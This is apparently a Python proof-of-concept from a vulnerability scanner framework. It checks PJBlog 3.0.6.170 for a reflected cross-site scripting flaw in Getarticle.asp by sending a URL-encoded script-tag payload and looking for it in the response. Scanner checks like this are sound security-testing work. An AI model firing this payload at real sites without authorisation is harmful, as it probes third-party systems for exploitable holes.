# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib,urllib2
import re
import hashlib

class Vuln(ABVuln):
    vuln_id = 'PJBlog_0001' # 平台漏洞编号，留空
    name = 'PJBlog 3.0.6.170 /Getarticle.asp XSS漏洞' # 漏洞名称
    level = VulnLevel.MED # 漏洞危害级别
    type = VulnType.XSS # 漏洞类型
    disclosure_date = '2009-05-08'  # 漏洞公布时间
    desc = '''
        漏洞文件：Getarticle.asp
    ''' # 漏洞描述
    ref = 'https://www.seebug.org/vuldb/ssvid-11237' # 漏洞来源
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown' #cve编号
    product = 'PJBlog'  # 漏洞应用名称
    product_version = '3.0.6.170'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '7e5523b9-5fd2-4ed5-ba28-65bb13738a7f'
    author = '国光'  # POC编写者
    create_date = '2018-05-11' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = '/Getarticle.asp?id=1&blog_postFile=x%22%20)></a>%3Cscript%3Ealert%28%22bb2%22%29%3C%2Fscript%3E&page=2' 
            verify_url = '{target}'.format(target=self.target)+payload
            req = urllib2.Request(verify_url)
            content = urllib2.urlopen(req).read()
            
            if '<script>alert("bb2")</script>' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()